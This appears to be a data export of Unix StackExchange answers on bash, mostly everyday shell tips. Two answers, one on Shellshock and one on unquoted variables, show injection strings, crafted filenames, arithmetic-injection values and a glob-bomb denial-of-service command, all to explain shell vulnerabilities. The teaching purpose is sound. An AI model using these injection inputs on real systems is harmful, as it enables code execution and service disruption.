<p>If something is stuck outputting colour when you don't want it to, I use this <code>sed</code> line to strip the escape sequences:</p>

<pre><code>sed ""s/\[^[[0-9;]*[a-zA-Z]//gi""
</code></pre>

<p>If you want a more authentic experience, you can also get rid of lines starting with <code>\e[8m</code>, which instructs the terminal to hide the text. (Not widely supported.)</p>

<pre><code>sed ""s/^\[^[8m.*$//gi""
</code></pre>

<p>Also note that those ^[s should be actual, literal ^[s. You can type them by pressing ^V^[ in bash, that is <kbd>Ctrl</kbd> + <kbd>V</kbd>, <kbd>Ctrl</kbd> + <kbd>[</kbd>. </p>
"
"In a bash script, using the conditional ""or"" in an ""if"" statement","47584","<bash><shell-script>","260","<p>If you want to say <code>OR</code> use double pipe (<code>||</code>).</p>

<pre><code>if [ ""$fname"" = ""a.txt"" ] || [ ""$fname"" = ""c.txt"" ]
</code></pre>

<p>(The original OP code using <code>|</code> was simply piping the output of the left side to the right side, in the same way any ordinary pipe works.)</p>

<hr>

<p>After many years of comments and misunderstanding, allow me to clarify.</p>

<p>To do <code>OR</code> you use <code>||</code>.</p>

<p>Whether you use <code>[</code> or <code>[[</code> or <code>test</code> or <code>((</code> all depends on what you need on a case by case basis. It's wrong to say that one of those is preferred in all cases. Sometimes <code>[</code> is right and <code>[[</code> is wrong. But that's not what the question was. OP asked why <code>|</code> didn't work. The answer is because it should be <code>||</code> instead.</p>
"
"How to remove a single line from history?","49214","<bash><shell><command-line><command-history>","258","<h1>Preventative measures</h1>

<p>If you want to run a command without saving it in history, prepend it with an extra space</p>

<pre><code>prompt$ echo saved
prompt$  echo not saved \
&gt; #     ^ extra space
</code></pre>

<p>For this to work you need either <code>ignorespace</code> or <code>ignoreboth</code> in <code>HISTCONTROL</code>.  For example, run</p>

<pre><code>HISTCONTROL=ignorespace
</code></pre>

<p>To make this setting persistent, put it in your <code>.bashrc</code>.</p>

<h1>Post-mortem clean-up</h1>

<p>If you've already run the command, and want to remove it from history, first use</p>

<pre><code>history
</code></pre>

<p>to display the list of commands in your history.  Find the number next to the one you want to delete (e.g. 1234) and run </p>

<pre><code>history -d 1234
</code></pre>

<p>Additionally, if the line you want to delete has already been written to your $HISTFILE (which typically happens when you end a session by default), you will need to write back to $HISTFILE, or the line will reappear when you open a new session:</p>

<pre><code>history -w
</code></pre>
"
"Why doesn't my Bash script recognize aliases?","1496","<bash><alias>","256","<p>First of all, as ddeimeke said, aliases by default are not expanded in non-interactive shells.</p>

<p>Second, <code>.bashrc</code> is not read by non-interactive shells unless you set the <code>BASH_ENV</code> environment variable.</p>

<p>But most importantly: don't do that! Please? One day you will move that script somewhere where the necessary aliases are not set and it will break again.</p>

<p>Instead set and use variables as shortcuts in your script:</p>

<pre><code>#!/bin/bash

CMDA=/path/to/gizmo
CMDB=/path/to/huzzah.sh

for file in ""$@""
do
    $CMDA ""$file""
    $CMDB ""$file""
done
</code></pre>
"
"What does env x='() { :;}; command' bash do and why is it insecure?","157329","<bash><shellshock><vulnerability>","246","<p>bash stores exported function definitions as environment variables. Exported functions look like this:</p>

<pre class=""lang-none prettyprint-override""><code>$ foo() { bar; }
$ export -f foo
$ env | grep -A1 foo
foo=() {  bar
}
</code></pre>

<p>That is, the environment variable <code>foo</code> has the literal contents:</p>

<pre class=""lang-none prettyprint-override""><code>() {  bar
}
</code></pre>

<p>When a new instance of bash launches, it looks for these specially crafted environment variables, and interprets them as function definitions. You can even write one yourself, and see that it still works:</p>

<pre class=""lang-none prettyprint-override""><code>$ export foo='() { echo ""Inside function""; }'
$ bash -c 'foo'
Inside function
</code></pre>

<p>Unfortunately, the parsing of function definitions from strings (the environment variables) can have wider effects than intended. In unpatched versions, it also interprets arbitrary commands that occur after the termination of the function definition. This is due to insufficient constraints in the determination of acceptable function-like strings in the environment. For example:</p>

<pre class=""lang-none prettyprint-override""><code>$ export foo='() { echo ""Inside function"" ; }; echo ""Executed echo""'
$ bash -c 'foo'
Executed echo
Inside function
</code></pre>

<p>Note that the echo outside the function definition has been unexpectedly executed during bash startup. The function definition is just a step to get the evaluation and exploit to happen, the function definition itself and the environment variable used are arbitrary. The shell looks at the environment variables, sees <code>foo</code>, which looks like it meets the constraints it knows about what a function definition looks like, and it evaluates the line, unintentionally also executing the echo (which could be any command, malicious or not).</p>

<p>This is considered insecure because variables are not typically allowed or expected, by themselves, to directly cause the invocation of arbitrary code contained in them. Perhaps your program sets environment variables from untrusted user input. It would be highly unexpected that those environment variables could be manipulated in such a way that the user could run arbitrary commands without your explicit intent to do so using that environment variable for such a reason declared in the code.</p>

<p>Here is an example of a viable attack. You run a web server that runs a vulnerable shell, somewhere, as part of its lifetime. This web server passes environment variables to a bash script, for example, if you are using CGI, information about the HTTP request is often included as environment variables from the web server. For example, <code>HTTP_USER_AGENT</code> might be set to the contents of your user agent. This means that if you spoof your user agent to be something like '() { :; }; echo foo', when that shell script runs, <code>echo foo</code> will be executed. Again, <code>echo foo</code> could be anything, malicious or not.</p>
"
"How do I change the extension of multiple files?","19654","<bash><shell-script><rename>","244","<p>Straight from <a href=""https://mywiki.wooledge.org/BashFAQ/030"" rel=""noreferrer"">Greg's Wiki</a>:</p>

<pre>
# Rename all *.txt to *.text
for f in *.txt; do 
    mv -- ""$f"" ""${f%.txt}.text""
done
</pre>

<p>Also see the entry on why you <a href=""https://mywiki.wooledge.org/ParsingLs"" rel=""noreferrer"">shouldn't parse <code>ls</code></a>.</p>

<p>Edit: if you have to use <code>basename</code>, your syntax would be:</p>

<pre>
for f in *.txt; do
    mv -- ""$f"" ""$(basename -- ""$f"" .txt).text""
done
</pre>
"
"What is the ""eval"" command in bash?","23111","<bash><shell><eval>","241","<p><code>eval</code> is part of POSIX. Its an interface which can be a shell built-in.</p>

<p>Its described in the ""POSIX Programmer's Manual"": <a href=""http://www.unix.com/man-page/posix/1posix/eval/"">http://www.unix.com/man-page/posix/1posix/eval/</a></p>

<pre><code>eval - construct command by concatenating arguments
</code></pre>

<p>It will take an argument and construct a command of it, which will be executed by the shell. This is the example of the manpage:</p>

<pre><code>1) foo=10 x=foo
2) y='$'$x
3) echo $y
4) $foo
5) eval y='$'$x
6) echo $y
7) 10
</code></pre>

<ol>
<li>In the first line you define <code>$foo</code> with the value <code>'10'</code> and <code>$x</code> with the value <code>'foo'</code>. </li>
<li>Now define <code>$y</code>, which consists of the string <code>'$foo'</code>. The dollar sign must be escaped
with <code>'$'</code>. </li>
<li>To check the result, <code>echo $y</code>.</li>
<li>The result will be the string <code>'$foo'</code></li>
<li>Now we repeat the assignment with <code>eval</code>. It will first evaluate <code>$x</code> to the string <code>'foo'</code>. Now we have the statement <code>y=$foo</code> which will get evaluated to <code>y=10</code>.</li>
<li>The result of <code>echo $y</code> is now the value <code>'10'</code>.</li>
</ol>

<p>This is a common function in many languages, e.g. Perl and JavaScript.
Have a look at perldoc eval for more examples: <a href=""http://perldoc.perl.org/functions/eval.html"">http://perldoc.perl.org/functions/eval.html</a></p>
"
"How can I make ""Press any key to continue""","293940","<bash>","234","<p>You can use the <code>read</code> command:</p>

<pre><code>read -p ""Press enter to continue""
</code></pre>

<p>As mentioned in the comments above, this command does actually require the user to press <kbd>enter</kbd>; a solution that works with any key would be:</p>

<pre><code>read -n 1 -s -r -p ""Press any key to continue""
</code></pre>

<h2>Explanation by <a href=""https://unix.stackexchange.com/users/10938/rayne"">Rayne</a> and <a href=""https://unix.stackexchange.com/users/37380/wchargin"">wchargin</a></h2>

<p><code>-n</code> defines the required character count to stop reading</p>

<p><code>-s</code> hides the user's input</p>

<p><code>-r</code> causes the string to be interpreted ""raw"" (without considering backslash escapes)</p>
"
"How can I get the current working directory?","188182","<bash><shell><scripting><directory>","232","<p>There's no need to do that, it's already <em>in</em> a variable:</p>

<pre><code>$ echo $PWD
/home/terdon
</code></pre>

<p>The <code>PWD</code> variable is <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html"" rel=""noreferrer"">defined by POSIX</a> and will work on all POSIX-compliant shells:</p>

<blockquote>
  <p>PWD </p>
  
  <p>Set by the shell and by the cd utility. In the shell the value
  shall be initialized from the environment as follows. If a value for
  PWD is passed to the shell in the environment when it is executed, the
  value is an absolute pathname of the current working directory that is
  no longer than {PATH_MAX} bytes including the terminating null byte,
  and the value does not contain any components that are dot or dot-dot,
  then the shell shall set PWD to the value from the environment.
  Otherwise, if a value for PWD is passed to the shell in the
  environment when it is executed, the value is an absolute pathname of
  the current working directory, and the value does not contain any
  components that are dot or dot-dot, then it is unspecified whether the
  shell sets PWD to the value from the environment or sets PWD to the
  pathname that would be output by pwd -P. Otherwise, the sh utility
  sets PWD to the pathname that would be output by pwd -P. In cases
  where PWD is set to the value from the environment, the value can
  contain components that refer to files of type symbolic link. In cases
  where PWD is set to the pathname that would be output by pwd -P, if
  there is insufficient permission on the current working directory, or
  on any parent of that directory, to determine what that pathname would
  be, the value of PWD is unspecified. Assignments to this variable may
  be ignored. If an application sets or unsets the value of PWD, the
  behaviors of the cd and pwd utilities are unspecified.</p>
</blockquote>

<hr>

<p>For the more general answer, the way to save the output of a command in a variable is to enclose the command in <code>$()</code> or <code>` `</code> (backticks):</p>

<pre><code>var=$(command)
</code></pre>

<p>or</p>

<pre><code>var=`command`
</code></pre>

<p>Of the two, the <code>$()</code> is preferred since it is easier to build complex commands like <code>command0 $(command1 $(command2 $(command3)))</code>.</p>
"
"Security implications of forgetting to quote a variable in bash/POSIX shells","171346","<bash><shell><shell-script><security><quoting>","230","<h2>Preamble</h2>
<p>First, I'd say it's not the right way to address the problem.
It's a bit like saying &quot;<em>you should not murder people because
otherwise you'll go to jail</em>&quot;.</p>
<p>Similarly, you don't quote your variable because otherwise
you're introducing security vulnerabilities. You quote your
variables because it is wrong not to (but if the fear of the jail can help, why not).</p>
<p>A little summary for those who've just jumped on the train.</p>
<p>In most shells, leaving a variable expansion unquoted (though
that (and the rest of this answer) also applies to command
substitution (<code>`...`</code> or <code>$(...)</code>) and arithmetic expansion (<code>$((...))</code> or <code>$[...]</code>)) has a very special
meaning. The best way to describe it is that it is like
invoking some sort of implicit <em>split+glob</em> operator¹.</p>
<pre><code>cmd $var
</code></pre>
<p>in another language would be written something like:</p>
<pre><code>cmd(glob(split($var)))
</code></pre>
<p><code>$var</code> is first split into a list of words according to complex
rules involving the <code>$IFS</code> special parameter (the <em>split</em> part)
and then each word resulting of that splitting is considered as
a <em>pattern</em> which is expanded to a list of files that match it
(the <em>glob</em> part).</p>
<p>As an example, if <code>$var</code> contains <code>*.txt,/var/*.xml</code> and <code>$IFS</code>
contains <code>,</code>, <code>cmd</code> would be called with a number of arguments,
the first one being <code>cmd</code> and the next ones being the <code>txt</code>
files in the current directory and the <code>xml</code> files in <code>/var</code>.</p>
<p>If you wanted to call <code>cmd</code> with just the two literal arguments <code>cmd</code>
and <code>*.txt,/var/*.xml</code>, you'd write:</p>
<pre><code>cmd &quot;$var&quot;
</code></pre>
<p>which would be in your other more familiar language:</p>
<pre><code>cmd($var)
</code></pre>
<h2>What do we mean by <em>vulnerability in a shell</em>?</h2>
<p>After all, it's been known since the dawn of time that shell
scripts should not be used in security-sensitive contexts.
Surely,  OK, leaving a variable unquoted is a bug but that can't
do that much harm, can it?</p>
<p>Well, despite the fact that anybody would tell you that shell
scripts should never be used for web CGIs, or that thankfully
most systems don't allow setuid/setgid shell scripts nowadays,
one thing that shellshock (the remotely exploitable bash bug
that made the headlines in September 2014) revealed is that
shells are still extensively used where they probably shouldn't:
in CGIs, in DHCP client hook scripts, in sudoers commands,
invoked <em>by</em> (if not <em>as</em>) setuid commands...</p>
<p>Sometimes unknowingly. For instance <code>system('cmd $PATH_INFO')</code>
in a <code>php</code>/<code>perl</code>/<code>python</code> CGI script does invoke a shell to interpret that command line (not to
mention the fact that <code>cmd</code> itself may be a shell script and its
author may have never expected it to be called from a CGI).</p>
<p>You've got a vulnerability when there's a path for privilege
escalation, that is when someone (let's call him <em>the attacker</em>)
is able to do something he is not meant to.</p>
<p>Invariably that means <em>the attacker</em> providing data, that data
being processed by a privileged user/process which inadvertently
does something it shouldn't be doing, in most of the cases because
of a bug.</p>
<p>Basically, you've got a problem when your buggy code processes
data under the control of <em>the attacker</em>.</p>
<p>Now, it's not always obvious where that <em>data</em> may come from,
and it's often hard to tell if your code will ever get to
process untrusted data.</p>
<p>As far as variables are concerned, In the case of a CGI script,
it's quite obvious, the data are the CGI GET/POST parameters and
things like cookies, path, host... parameters.</p>
<p>For a setuid script (running as one user when invoked by
another), it's the arguments or environment variables.</p>
<p>Another very common vector is file names. If you're getting a
file list from a directory, it's possible that files have been
planted there by <em>the attacker</em>.</p>
<p>In that regard, even at the prompt of an interactive shell, you
could be vulnerable (when processing files in <code>/tmp</code> or <code>~/tmp</code>
for instance).</p>
<p>Even a <code>~/.bashrc</code> can be vulnerable (for instance, <code>bash</code> will
interpret it when invoked over <code>ssh</code> to run a <code>ForcedCommand</code>
like in <code>git</code> server deployments with some variables under the
control of the client).</p>
<p>Now, a script may not be called directly to process untrusted
data, but it may be called by another command that does. Or your
incorrect code may be copy-pasted into scripts that do (by you 3
years down the line or one of your colleagues). One place where it's
particularly <em>critical</em> is in answers in Q&amp;A sites as you'll
never know where copies of your code may end up.</p>
<h2>Down to business; how bad is it?</h2>
<p>Leaving a variable (or command substitution) unquoted is by far
the number one source of security vulnerabilities associated
with shell code. Partly because those bugs often translate to
vulnerabilities but also because it's so common to see unquoted
variables.</p>
<p>Actually, when looking for vulnerabilities in shell code, the
first thing to do is look for unquoted variables. It's easy to
spot, often a good candidate, generally easy to track back to
attacker-controlled data.</p>
<p>There's an infinite number of ways an unquoted variable can turn
into a vulnerability. I'll just give a few common trends here.</p>
<h3>Information disclosure</h3>
<p>Most people will bump into bugs associated with unquoted
variables because of the <em>split</em> part (for instance, it's
common for files to have spaces in their names nowadays and space
is in the default value of IFS). Many people will overlook the
<em>glob</em> part. The <em>glob</em> part is at least as dangerous as the
<em>split</em> part.</p>
<p>Globbing done upon unsanitised external input means <em>the
attacker</em> can make you read the content of any directory.</p>
<p>In:</p>
<pre><code>echo You entered: $unsanitised_external_input
</code></pre>
<p>if <code>$unsanitised_external_input</code> contains <code>/*</code>, that means <em>the
attacker</em> can see the content of <code>/</code>. No big deal. It becomes
more interesting though with <code>/home/*</code> which gives you a list of
user names on the machine, <code>/tmp/*</code>,  <code>/home/*/.forward</code> for
hints at other dangerous practises, <code>/etc/rc*/*</code> for enabled
services... No need to name them individually. A value of <code>/* /*/* /*/*/*...</code> will just list the whole file system.</p>
<h3>Denial of service vulnerabilities.</h3>
<p>Taking the previous case a bit too far and we've got a DoS.</p>
<p>Actually, any unquoted variable in list context with unsanitized
input is <em>at least</em> a DoS vulnerability.</p>
<p>Even expert shell scripters commonly forget to quote things
like:</p>
<pre><code>#! /bin/sh -
: ${QUERYSTRING=$1}
</code></pre>
<p><code>:</code> is the no-op command. What could possibly go wrong?</p>
<p>That's meant to assign <code>$1</code> to <code>$QUERYSTRING</code> if <code>$QUERYSTRING</code>
was unset. That's a quick way to make a CGI script callable from
the command line as well.</p>
<p>That <code>$QUERYSTRING</code> is still expanded though and because it's
not quoted, the <em>split+glob</em> operator is invoked.</p>
<p>Now, there are some globs that are particularly expensive to
expand. The <code>/*/*/*/*</code> one is bad enough as it means listing
directories up to 4 levels down. In addition to the disk and CPU
activity, that means storing tens of thousands of file paths
(40k here on a minimal server VM, 10k of which directories).</p>
<p>Now <code>/*/*/*/*/../../../../*/*/*/*</code> means 40k x 10k and
<code>/*/*/*/*/../../../../*/*/*/*/../../../../*/*/*/*</code> is enough to
bring even the mightiest machine to its knees.</p>
<p>Try it for yourself (though be prepared for your machine to
crash or hang):</p>
<pre><code>a='/*/*/*/*/../../../../*/*/*/*/../../../../*/*/*/*' sh -c ': ${a=foo}'
</code></pre>
<p>Of course, if the code is:</p>
<pre><code>echo $QUERYSTRING &gt; /some/file
</code></pre>
<p>Then you can fill up the disk.</p>
<p>Just do a google search on <a href=""https://www.google.co.uk/search?q=shell+cgi"" rel=""nofollow noreferrer"">shell
cgi</a> or <a href=""https://www.google.co.uk/search?q=bash+cgi"" rel=""nofollow noreferrer"">bash
cgi</a> or <a href=""https://www.google.co.uk/search?q=ksh+cgi"" rel=""nofollow noreferrer"">ksh
cgi</a>, and you'll find
a few pages that show you how to write CGIs in shells. Notice
how half of those that process parameters are vulnerable.</p>
<p>Even <a href=""https://web.archive.org/web/20150430175848/http://www2.research.att.com/%7Eastopen/download/ksh/scripts/cgi-lib.ksh"" rel=""nofollow noreferrer"">David Korn's
own
one</a>
is vulnerable (look at the cookie handling).</p>
<h3>up to arbitrary code execution vulnerabilities</h3>
<p>Arbitrary code execution is the worst type of vulnerability,
since if <em>the attacker</em> can run any command, there's no limit on
what he may do.</p>
<p>That's generally the <em>split</em> part that leads to those. That
splitting results in several arguments to be passed to commands
when only one is expected. While the first of those will be used
in the expected context, the others will be in a different context
so potentially interpreted differently. Better with an example:</p>
<pre><code>awk -v foo=$external_input '$2 == foo'
</code></pre>
<p>Here, the intention was to assign the content of the
<code>$external_input</code> shell variable to the <code>foo</code> <code>awk</code> variable.</p>
<p>Now:</p>
<pre><code>$ external_input='x BEGIN{system(&quot;uname&quot;)}'
$ awk -v foo=$external_input '$2 == foo'
Linux
</code></pre>
<p>The second word resulting of the splitting of <code>$external_input</code>
is not assigned to <code>foo</code> but considered as <code>awk</code> code (here that
executes an arbitrary command: <code>uname</code>).</p>
<p>That's especially a problem for commands that can execute other
commands (<code>awk</code>, <code>env</code>, <code>sed</code> (GNU one), <code>perl</code>, <code>find</code>...) especially
with the GNU variants (which accept options after arguments).
Sometimes, you wouldn't suspect commands to be able to execute
others like <code>ksh</code>, <code>bash</code> or <code>zsh</code>'s <code>[</code> or <code>printf</code>...</p>
<pre><code>for file in *; do
  [ -f $file ] || continue
  something-that-would-be-dangerous-if-$file-were-a-directory
done
</code></pre>
<p>If we create a directory called <code>x -o yes</code>, then the test
becomes positive, because it's a completely different
conditional expression we're evaluating.</p>
<p>Worse, if we create a file called <code>x -a a[0$(uname&gt;&amp;2)] -gt 1</code>,
with all ksh implementations at least (which includes the <code>sh</code>
of most commercial Unices and some BSDs), that executes <code>uname</code>
because those shells perform arithmetic evaluation on the
numerical comparison operators of the <code>[</code> command.</p>
<pre><code>$ touch x 'x -a a[0$(uname&gt;&amp;2)] -gt 1'
$ ksh -c 'for f in *; do [ -f $f ]; done'
Linux
</code></pre>
<p>Same with <code>bash</code> for a filename like <code>x -a -v a[0$(uname&gt;&amp;2)]</code>.</p>
<p>Of course, if they can't get arbitrary execution, <em>the attacker</em> may
settle for lesser damage (which may help to get arbitrary
execution). Any command that can write files or change
permissions, ownership or have any main or side effect could be exploited.</p>
<p>All sorts of things can be done with file names.</p>
<pre><code>$ touch -- '-R ..'
$ for file in *; do [ -f &quot;$file&quot; ] &amp;&amp; chmod +w $file; done
</code></pre>
<p>And you end up making <code>..</code> writeable (recursively with GNU
<code>chmod</code>).</p>
<p>Scripts doing automatic processing of files in publicly writable areas like <code>/tmp</code> are to be written very carefully.</p>
<h3>What about <code>[ $# -gt 1 ]</code></h3>
<p>That's something I find exasperating. Some people go down all
the trouble of wondering whether a particular expansion may be
problematic to decide if they can omit the quotes.</p>
<p>It's like saying. <em>Hey, it looks like <code>$#</code> cannot be subject to
the split+glob operator, let's ask the shell to split+glob it</em>.
Or <em>Hey, let's write incorrect code just because the bug is
unlikely to be hit</em>.</p>
<p>Now how unlikely is it? OK, <code>$#</code> (or <code>$!</code>, <code>$?</code> or any
arithmetic substitution) may only contain digits (or <code>-</code> for
some²) so the <em>glob</em> part is out. For the <em>split</em> part to do
something though, all we need is for <code>$IFS</code> to contain digits (or <code>-</code>).</p>
<p>With some shells, <code>$IFS</code> may be inherited from the environment,
but if the environment is not safe, it's game over anyway.</p>
<p>Now if you write a function like:</p>
<pre><code>my_function() {
  [ $# -eq 2 ] || return
  ...
}
</code></pre>
<p>What that means is that the behaviour of your function depends
on the context in which it is called. Or in other words, <code>$IFS</code>
becomes one of the inputs to it. Strictly speaking, when you
write the API documentation for your function, it should be
something like:</p>
<pre><code># my_function
#   inputs:
#     $1: source directory
#     $2: destination directory
#   $IFS: used to split $#, expected not to contain digits...
</code></pre>
<p>And code calling your function needs to make sure <code>$IFS</code> doesn't
contain digits. All that because you didn't feel like typing
those 2 double-quote characters.</p>
<p>Now, for that <code>[ $# -eq 2 ]</code> bug to become a vulnerability,
you'd need somehow for the value of <code>$IFS</code> to become under
control of <em>the attacker</em>. Conceivably, that would not normally
happen unless <em>the attacker</em> managed to exploit another bug.</p>
<p>That's not unheard of though. A common case is when people
forget to sanitize data before using it in arithmetic
expression. We've already seen above that it can allow
arbitrary code execution in some shells, but in all of them, it allows
<em>the attacker</em> to give any variable an integer value.</p>
<p>For instance:</p>
<pre><code>n=$(($1 + 1))
if [ $# -gt 2 ]; then
  echo &gt;&amp;2 &quot;Too many arguments&quot;
  exit 1
fi
</code></pre>
<p>And with a <code>$1</code> with value <code>(IFS=-1234567890)</code>, that arithmetic
evaluation has the side effect of settings IFS and the next <code>[</code>
command fails which means the check for <em>too many args</em> is
bypassed.</p>
<h3>What about when the <em>split+glob</em> operator is not invoked?</h3>
<p>There's another case where quotes are needed around variables and other expansions: when it's used as a pattern.</p>
<pre><code>[[ $a = $b ]]   # a `ksh` construct also supported by `bash`
case $a in ($b) ...; esac
</code></pre>
<p>do not test whether <code>$a</code> and <code>$b</code> are the same (except with <code>zsh</code>) but if <code>$a</code> matches the pattern in <code>$b</code>. And you need to quote <code>$b</code> if you want to compare as strings (same thing in <code>&quot;${a#$b}&quot;</code> or <code>&quot;${a%$b}&quot;</code> or <code>&quot;${a##*$b*}&quot;</code> where <code>$b</code> should be quoted if it's not to be taken as a pattern).</p>
<p>What that means is that <code>[[ $a = $b ]]</code> may return true in cases where <code>$a</code> is different from <code>$b</code> (for instance when <code>$a</code> is <code>anything</code> and <code>$b</code> is <code>*</code>) or may return false when they are identical (for instance when both <code>$a</code> and <code>$b</code> are <code>[a]</code>).</p>
<p>Can that make for a security vulnerability? Yes, like any bug. Here, <em>the attacker</em> can alter your script's logical code flow and/or break the assumptions that your script are making. For instance, with a code like:</p>
<pre><code>if [[ $1 = $2 ]]; then
   echo &gt;&amp;2 '$1 and $2 cannot be the same or damage will incur'
   exit 1
fi
</code></pre>
<p><em>The attacker</em> can bypass the check by passing <code>'[a]' '[a]'</code>.</p>
<p>Now, if neither that pattern matching nor the <em>split+glob</em> operator apply, what's the danger of leaving a variable unquoted?</p>
<p>I have to admit that I do write:</p>
<pre><code>a=$b
case $a in...
</code></pre>
<p>There, quoting doesn't harm but is not strictly necessary.</p>
<p>However, one side effect of omitting quotes in those cases (for instance in Q&amp;A answers) is that it can send a wrong message to beginners: <strike><em>that it may be all right not to quote variables</em></strike>.</p>
<p>For instance, they may start thinking that if <code>a=$b</code> is OK, then <strike><code>export a=$b</code></strike> would be as well (which <a href=""/a/97569/135943"">it's not in many shells</a> as it's in arguments to the <code>export</code> command so in list context) or <strike><code>env a=$b</code></strike>.</p>
<h3>What about <code>zsh</code>?</h3>
<p><code>zsh</code> did fix most of those design awkwardnesses. In <code>zsh</code> (at least when not in sh/ksh emulation mode), if you want <em>splitting</em>, or <em>globbing</em>, or <em>pattern matching</em>, you have to request it explicitly: <code>$=var</code> to split, and <code>$~var</code> to glob or for the content of the variable to be treated as a pattern.</p>
<p>However, splitting (but not globbing) is still done implicitly upon unquoted command substitution (as in <code>echo $(cmd)</code>).</p>
<p>Also, a sometimes unwanted side effect of not quoting variable is the <em>empties removal</em>. The <code>zsh</code> behaviour is similar to what you can achieve in other shells by disabling globbing altogether (with <code>set -f</code>) and splitting (with <code>IFS=''</code>). Still, in:</p>
<pre><code>cmd $var
</code></pre>
<p>There will be no <em>split+glob</em>, but if <code>$var</code> is empty, instead of receiving one empty argument, <code>cmd</code> will receive no argument at all.</p>
<p>That can cause bugs (like the obvious <code>[ -n $var ]</code>). That can possibly break a script's expectations and assumptions and cause vulnerabilities.</p>
<p>As the empty variable can cause an argument to be just <em>removed</em>, that means the  next argument could be interpreted in the wrong context.</p>
<p>As an example,</p>
<pre><code>printf '[%d] &lt;%s&gt;\n' 1 $attacker_supplied1 2 $attacker_supplied2
</code></pre>
<p>If <code>$attacker_supplied1</code> is empty,  then <code>$attacker_supplied2</code> will be interpreted as an arithmetic expression (for <code>%d</code>) instead of a string (for <code>%s</code>) and <a href=""/q/172103"">any unsanitized data used in an arithmetic expression is a command injection vulnerability in Korn-like shells such as zsh</a>.</p>
<pre><code>$ attacker_supplied1='x y' attacker_supplied2='*'
$ printf '[%d] &lt;%s&gt;\n' 1 $attacker_supplied1 2 $attacker_supplied2
[1] &lt;x y&gt;
[2] &lt;*&gt;
</code></pre>
<p>fine, but:</p>
<pre><code>$ attacker_supplied1='' attacker_supplied2='psvar[$(uname&gt;&amp;2)0]'
$ printf '[%d] &lt;%s&gt;\n' 1 $attacker_supplied1 2 $attacker_supplied2
Linux
[1] &lt;2&gt;
[0] &lt;&gt;
</code></pre>
<p>The <code>uname</code> <em>arbitrary command</em> was run.</p>
<h3>What about when you <em>do</em> need the <em>split+glob</em> operator?</h3>
<p>Yes, that's typically when you do want to leave your variable unquoted. But then you need to make sure you tune your <em>split</em> and <em>glob</em> operators correctly before using it. If you only want the <em>split</em> part and not the <em>glob</em> part (which is the case most of the time), then you do need to disable globbing (<code>set -o noglob</code>/<code>set -f</code>) and fix <code>$IFS</code>. Otherwise you'll cause vulnerabilities as well (like David Korn's CGI example mentioned above).</p>
<h2>Conclusion</h2>
<p>In short, leaving a variable (or command substitution or
arithmetic expansion) unquoted in shells can be very dangerous
indeed especially when done in the wrong contexts, and it's very
hard to know which are those wrong contexts.</p>
<p>That's one of the reasons why it is considered <em>bad practice</em>.</p>
<p>Thanks for reading so far. If it goes over your head, don't
worry. One can't expect everyone to understand all the implications of
writing their code the way they write it. That's why we have
<em>good practice recommendations</em>, so they can be followed without
necessarily understanding why.</p>
<p>(and in case that's not obvious yet, please avoid writing
security sensitive code in shells).</p>
<p>And <strong>please quote your variables on your answers on this site!</strong></p>
<hr />
<p><sup>¹In <code>ksh93</code> and <code>pdksh</code> and derivatives, <em>brace expansion</em> is also performed unless globbing is disabled (in the case of <code>ksh93</code> versions up to ksh93u+, even when the <code>braceexpand</code> option is disabled).</sup></p>
<p><sup>² In <code>ksh93</code> and <code>yash</code>, arithmetic expansions can also include things like <code>1,2</code>, <code>1e+66</code>, <code>inf</code>, <code>nan</code>. There are even more in <code>zsh</code>, including <code>#</code> which is glob operator with <code>extendedglob</code>, but <code>zsh</code> never does split+glob upon arithmetic expansion, even in <code>sh</code> emulation</sup></p>
"
"How to add a newline to the end of a file?","31947","<bash><shell><text-processing><newlines>","223","<p>To recursively sanitize a project I use this oneliner:</p>

<pre><code>git ls-files -z | while IFS= read -rd '' f; do tail -c1 &lt; ""$f"" | read -r _ || echo &gt;&gt; ""$f""; done
</code></pre>

<p>Explanation:</p>

<ul>
<li><p><a href=""https://git-scm.com/docs/git-ls-files"" rel=""noreferrer""><code>git ls-files -z</code></a> lists files in the repository. It takes an optional pattern as additional parameter which might be useful in some cases if you want to restrict the operation to certain files/directories. As an alternative, you could use <code>find -print0 ...</code> or similar programs to list affected files - just make sure it emits <a href=""https://en.wikipedia.org/wiki/Null_character"" rel=""noreferrer""><code>NUL</code></a>-delimited entries.</p></li>
<li><p><code>while IFS= read -rd '' f; do ... done</code> iterates through the entries, safely handling filenames that include whitespace and/or newlines.</p></li>
<li><p><code>tail -c1 &lt; ""$f""</code> reads the last char from a file.</p></li>
<li><p><code>read -r _</code> exits with a nonzero exit status if a trailing newline is missing.</p></li>
<li><p><code>|| echo &gt;&gt; ""$f""</code> appends a newline to the file if the exit status of the previous command was nonzero.</p></li>
</ul>
"
"Execute a command once per line of piped input?","7558","<bash><shell><fish>","208","<p>That's what <code>xargs</code> does.</p>

<pre><code>... | xargs command
</code></pre>
"
"How to determine where an environment variable came from?","813","<bash><shell><environment-variables>","203","<p>If you use the <code>env</code> command to display the variables, they should show up roughly in the order in which they were created.  You can use this as a guide to if they were set by the system very early in the boot, or by a later .profile or other configuration file.  In my experience, the <code>set</code> and <code>export</code> commands will sort their variables by alphabetical order, so that listing isn't as useful.</p>
"
"What is the purpose of .bashrc and how does it work?","129143","<bash><bashrc>","200","<p><code>.bashrc</code> is a <a href=""http://en.wikipedia.org/wiki/Shell_script"" rel=""noreferrer"">shell script</a> that Bash runs whenever it is started interactively. It initializes an interactive shell session. You can put any command in that file that you could type at the command prompt.</p>

<p>You put commands here to set up the shell for use in your particular environment, or to customize things to your preferences. A common thing to put in <code>.bashrc</code> are <a href=""http://en.wikipedia.org/wiki/Alias_(command)"" rel=""noreferrer"">aliases</a> that you want to always be available.</p>

<p><code>.bashrc</code> runs on <em>every</em> interactive shell launch. If you say:</p>

<pre><code>$ bash ; bash ; bash
</code></pre>

<p>and then hit <kbd>Ctrl-D</kbd> three times, <code>.bashrc</code> will run three times.  But if you say this instead:</p>

<pre><code>$ bash -c exit ; bash -c exit ; bash -c exit
</code></pre>

<p>then <code>.bashrc</code> won't run at all, since <code>-c</code> makes the Bash call non-interactive. The same is true when you run a shell script from a file.</p>

<p>Contrast <code>.bash_profile</code> and <code>.profile</code> which are only run at the start of a new login shell. (<code>bash -l</code>) You choose whether a command goes in <code>.bashrc</code> vs <code>.bash_profile</code> depending on on whether you want it to run once or for every interactive shell start.</p>

